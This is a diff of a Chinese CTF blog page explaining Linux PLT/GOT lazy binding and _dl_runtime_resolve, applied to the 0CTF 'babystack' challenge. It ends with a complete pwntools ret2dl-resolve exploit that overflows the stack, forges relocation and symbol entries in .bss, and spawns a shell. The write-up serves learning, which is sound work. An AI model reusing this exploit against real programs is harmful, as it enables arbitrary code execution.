@@ -8,17 +8,28 @@
 
 <title>
   
-    Archive: 2018/7
+    结合dl_runtime源码分析0ctf babystack
   
 </title>
 
-<meta property="og:type" content="website">
-<meta property="og:title" content="pwndog&#39;s blog">
-<meta property="og:url" content="http://yoursite.com/archives/2018/07/index.html">
+<meta name="description" content="延迟载入linux导入函数的载入有别于windows，windows在内存装载后，起始代码执行前，由装载器通过导入表将所有函数地址写入IAT中。linux为了效率考虑，对所有导入函数采取延迟载入的方式。当进程第一次调用导入函数时，通过调用dl_runtime函数对函数进行寻址后保存在got表中并调用它。 plt表和got表got表类似windows下的IAT表，保存导入函数的内存地址。plt是延迟">
+<meta name="keywords" content="-CTF -GLIBC">
+<meta property="og:type" content="article">
+<meta property="og:title" content="结合dl_runtime源码分析0ctf babystack">
+<meta property="og:url" content="http://yoursite.com/2018/07/28/结合dl_runtime源码分析0ctf-babystack/index.html">
 <meta property="og:site_name" content="pwndog&#39;s blog">
+<meta property="og:description" content="延迟载入linux导入函数的载入有别于windows，windows在内存装载后，起始代码执行前，由装载器通过导入表将所有函数地址写入IAT中。linux为了效率考虑，对所有导入函数采取延迟载入的方式。当进程第一次调用导入函数时，通过调用dl_runtime函数对函数进行寻址后保存在got表中并调用它。 plt表和got表got表类似windows下的IAT表，保存导入函数的内存地址。plt是延迟">
 <meta property="og:locale" content="CN">
+<meta property="og:image" content="http://yoursite.com/2018/07/28/结合dl_runtime源码分析0ctf-babystack/1.png">
+<meta property="og:image" content="http://yoursite.com/2018/07/28/结合dl_runtime源码分析0ctf-babystack/3.png">
+<meta property="og:image" content="http://yoursite.com/2018/07/28/结合dl_runtime源码分析0ctf-babystack/2.png">
+<meta property="og:image" content="http://yoursite.com/2018/07/28/结合dl_runtime源码分析0ctf-babystack/5.png">
+<meta property="og:image" content="http://yoursite.com/2018/07/28/结合dl_runtime源码分析0ctf-babystack/6.png">
+<meta property="og:updated_time" content="2018-07-28T14:45:20.678Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="pwndog&#39;s blog">
+<meta name="twitter:title" content="结合dl_runtime源码分析0ctf babystack">
+<meta name="twitter:description" content="延迟载入linux导入函数的载入有别于windows，windows在内存装载后，起始代码执行前，由装载器通过导入表将所有函数地址写入IAT中。linux为了效率考虑，对所有导入函数采取延迟载入的方式。当进程第一次调用导入函数时，通过调用dl_runtime函数对函数进行寻址后保存在got表中并调用它。 plt表和got表got表类似windows下的IAT表，保存导入函数的内存地址。plt是延迟">
+<meta name="twitter:image" content="http://yoursite.com/2018/07/28/结合dl_runtime源码分析0ctf-babystack/1.png">
 
 
   <link rel="alternative" href="/atom.xml" title="pwndog&#39;s blog" type="application/atom+xml">
@@ -146,47 +157,30 @@
       
         <div style="max-width: 1000px">
       
-          
-
+          <article id="post-结合dl_runtime源码分析0ctf-babystack" class="article article-type-post">
+  
+    <h1 class="article-header">
+      结合dl_runtime源码分析0ctf babystack
+    </h1>
   
   
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <h1><a href="/archives/2018" class="archive-year">2018</a></h1>
-        </div>
-        <div class="post-list">
-    
-  
 
-    <div class="post-list-item article">
-      <h3 class="article-header">
-        <a href="/2018/07/28/结合dl_runtime源码分析0ctf-babystack/" >
-  结合dl_runtime源码分析0ctf babystack
-</a>
-
-      </h3>
-      
-
-      <div class="article-info">
-        <a href="/2018/07/28/结合dl_runtime源码分析0ctf-babystack/"><span class="article-date">
+  <div class="article-info">
+    <span class="article-date">
   2018-07-28
 </span>
-</a>
-        
 
-        
+    
+
+    
 	<span class="article-tag tagcloud">
 		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF-GLIBC/">-CTF -GLIBC</a></li></ul>
 	</span>
 
 
-      </div>
-      <div class="article-entry">
-        
-          <h3 id="延迟载入"><a href="#延迟载入" class="headerlink" title="延迟载入"></a>延迟载入</h3><p>linux导入函数的载入有别于windows，windows在内存装载后，起始代码执行前，由装载器通过导入表将所有函数地址写入IAT中。<br>linux为了效率考虑，对所有导入函数采取延迟载入的方式。<br>当进程第一次调用导入函数时，通过调用dl_runtime函数对函数进行寻址后保存在got表中并调用它。</p>
+  </div>
+  <div class="article-entry">
+    <h3 id="延迟载入"><a href="#延迟载入" class="headerlink" title="延迟载入"></a>延迟载入</h3><p>linux导入函数的载入有别于windows，windows在内存装载后，起始代码执行前，由装载器通过导入表将所有函数地址写入IAT中。<br>linux为了效率考虑，对所有导入函数采取延迟载入的方式。<br>当进程第一次调用导入函数时，通过调用dl_runtime函数对函数进行寻址后保存在got表中并调用它。</p>
 <h4 id="plt表和got表"><a href="#plt表和got表" class="headerlink" title="plt表和got表"></a>plt表和got表</h4><p>got表类似windows下的IAT表，保存导入函数的内存地址。<br>plt是延迟载入的核心。每条表项对应一个函数。每条表项由三条指令组成 如alarm函数1.jmp [got@alarm]2.push offset 3.jmp plt[0]<br><img src="/2018/07/28/结合dl_runtime源码分析0ctf-babystack/1.png" alt="plt表项"><br>若第一次调用alarm，got表保存的为plt表项中第二条指令，即进入解析流程，解析后got表会保存函数真正地址，之后的每次调用不需要进行再次解析。<br><img src="/2018/07/28/结合dl_runtime源码分析0ctf-babystack/3.png" alt="plt 0"><br>plt[0] push了got[1]，调用了got[2]，plt表函数表项从plt[1]开始，got表函数表项从got[2]开始。<br>plt[0]为解析函数入口代码<br>got[0]为dynamic地址<br>got[1]为模块ID<br>got[2]为_dl_runtime_resolve函数的地址<br>plt[0]作用即以模块ID为参数调用_dl_runtime_resolve进入解析过程</p>
 <h4 id="解析过程"><a href="#解析过程" class="headerlink" title="解析过程"></a>解析过程</h4><p>解析函数的入口为push 一个参数，跳转至plt[0]，plt[0]不用来解析某一函数，只用来保存解析函数入口，每个程序的plt[0]一样。<br><img src="/2018/07/28/结合dl_runtime源码分析0ctf-babystack/2.png" alt="elf节区偏移"></p>
 <p>_dl_runtime_resolve函数通过plt代码中第二条指令，push offset对不同函数进行解析。</p>
@@ -203,138 +197,29 @@
 <p>通过返回地址控制流程再次执行漏洞函数，控制程序流程，压入参数为 伪造reloc与reloc段偏移，调用_dl_runtime_resolve，控制栈内情况为1.伪造reloc与reloc段偏移<br>2.返回地址 3.bin/sh字符串地址<br>完成伪造函数的解析，并调用。拿到shell</p>
 <h3 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">offset = <span class="number">44</span></span><br><span class="line">readplt = <span class="number">0x08048300</span></span><br><span class="line">bss = <span class="number">0x0804a020</span></span><br><span class="line">vulFunc = <span class="number">0x0804843B</span></span><br><span class="line">rel_off=((bss+<span class="number">8</span>)<span class="number">-0x080482b0</span>)</span><br><span class="line">sym_off=((bss+<span class="number">28</span>)<span class="number">-0x080481cc</span>)/<span class="number">16</span></span><br><span class="line"><span class="keyword">print</span> sym_off</span><br><span class="line">str_off=(bss+<span class="number">44</span><span class="number">-0x0804822c</span>)</span><br><span class="line">p = process(<span class="string">'./babystack'</span>)</span><br><span class="line">context(log_level=<span class="string">'debug'</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">buf1 = <span class="string">'A'</span> * offset <span class="comment">#44</span></span><br><span class="line">buf1 += p32(readplt) + p32(vulFunc) + p32(<span class="number">0</span>) + p32(bss) + p32(<span class="number">100</span>)</span><br><span class="line">p.send(buf1)</span><br><span class="line"></span><br><span class="line">buf2 =<span class="string">'/bin/sh'</span></span><br><span class="line">buf2 +=chr(<span class="number">0</span>)</span><br><span class="line">buf2 += p32(<span class="number">0x0804a010</span>)</span><br><span class="line"><span class="keyword">print</span> sym_off </span><br><span class="line">buf2  +=p32(<span class="number">7</span>|(sym_off&lt;&lt;<span class="number">8</span>))</span><br><span class="line">buf2  +=p32(<span class="number">0</span>)*<span class="number">3</span> <span class="comment">#36</span></span><br><span class="line">buf2  +=p32(str_off)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0x12</span>)</span><br><span class="line">buf2  +=<span class="string">'system'</span></span><br><span class="line">buf2+=chr(<span class="number">0</span>)</span><br><span class="line">p.send(buf2)</span><br><span class="line">zz=raw_input()</span><br><span class="line">buf3 = <span class="string">'A'</span>*<span class="number">44</span> +p32(<span class="number">0x80482f0</span>)+p32(rel_off)+p32(<span class="number">1</span>)+p32(<span class="number">0x804a020</span>) </span><br><span class="line">p.send(buf3)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-        
-      </div>
-    </div>
-
-  
-
-  
-  
+  </div>
+  <footer class="article-footer">
     
-  
-
-    <div class="post-list-item article">
-      <h3 class="article-header">
-        <a href="/2018/07/27/0ctf-heapstorm笔记/" >
-  0ctf heapstorm笔记
-</a>
-
-      </h3>
+  <div class="cc">
+    <a href="http://creativecommons.org/licenses/by-sa/4.0/deed.C" target="_blank" title="Attribution-ShareAlike">
+      <img src="/images/cc/cc.png">
       
-
-      <div class="article-info">
-        <a href="/2018/07/27/0ctf-heapstorm笔记/"><span class="article-date">
-  2018-07-27
-</span>
-</a>
+          <img src="/images/cc/by.png">
         
+          <img src="/images/cc/sa.png">
+      
+      <span>
+        This work is licensed under a Creative Commons Attribution-ShareAlike 4.0 International License.
+      </span>
+    </a>
+  </div>
 
-        
-	<span class="article-tag tagcloud">
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
-	</span>
 
-
-      </div>
-      <div class="article-entry">
-        
-          <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近找到了0CTF2018的原题，对旧题进行了重新的学习，记录一下在学习过程中遇到的问题和新的理解。<br>在做题中参照了sakura大神看雪上的writeup，<a href="https://bbs.pediy.com/thread-225973.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-225973.htm</a><br></p>
-          <p>
-            <a href="/2018/07/27/0ctf-heapstorm笔记/">
-              Read More
-            </a>
-          </p>
-        
-      </div>
-    </div>
-
-  
-
-  
-  
     
-  
 
-    <div class="post-list-item article">
-      <h3 class="article-header">
-        <a href="/2018/07/25/CTF中的一点小疑惑/" >
-  CTF中的一点小疑惑
-</a>
+  </footer>
+</article>
 
-      </h3>
-      
-
-      <div class="article-info">
-        <a href="/2018/07/25/CTF中的一点小疑惑/"><span class="article-date">
-  2018-07-25
-</span>
-</a>
-        
-
-        
-	<span class="article-tag tagcloud">
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
-	</span>
-
-
-      </div>
-      <div class="article-entry">
-        
-          <h3 id="关于top-chunk的问题笔记"><a href="#关于top-chunk的问题笔记" class="headerlink" title="关于top chunk的问题笔记"></a>关于top chunk的问题笔记</h3><p>覆盖TOP chunksize小于0x1000后，使top chunk脱落下来成为unsorted chunk的问题。<br>如将top chunk size覆盖为0xfa1,此时申请0x1000可以使top chunk变为unsorted chunk，不断申请0x90的chunk，最后会产生异常情况。</p>
-<h3 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h3><p>因为top chunk 小于0x90后不会放入unsorted bin，会放入fast bin 链表。。</p>
-
-        
-      </div>
-    </div>
-
-  
-
-  
-  
-    
-  
-
-    <div class="post-list-item article">
-      <h3 class="article-header">
-        <a href="/2018/07/24/malloc函数源码笔记/" >
-  malloc函数源码笔记
-</a>
-
-      </h3>
-      
-
-      <div class="article-info">
-        <a href="/2018/07/24/malloc函数源码笔记/"><span class="article-date">
-  2018-07-24
-</span>
-</a>
-        
-	<span class="article-category tagcloud">
-	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/glibc源码阅读/">glibc源码阅读</a></li></ul>
-	</span>
-
-
-        
-	<span class="article-tag tagcloud">
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/GLIBC/">GLIBC</a></li></ul>
-	</span>
-
-
-      </div>
-      <div class="article-entry">
-        
-          <h2 id="chunk类型分类"><a href="#chunk类型分类" class="headerlink" title="chunk类型分类"></a>chunk类型分类</h2><h3 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h3><p>在32位linux下当请求的空间小于0x64时使用fastbin分配，即申请出来的chunk size&lt;0x50时使用fastbin分配.<br>在32位linux下当请求的空间小于0x80时使用fastbin分配，即申请出来的chunk size&lt;0x90时使用fastbin分配.<br></p>
-          <p>
-            <a href="/2018/07/24/malloc函数源码笔记/">
-              Read More
-            </a>
-          </p>
-        
-      </div>
-    </div>
-
-  
 
 
 
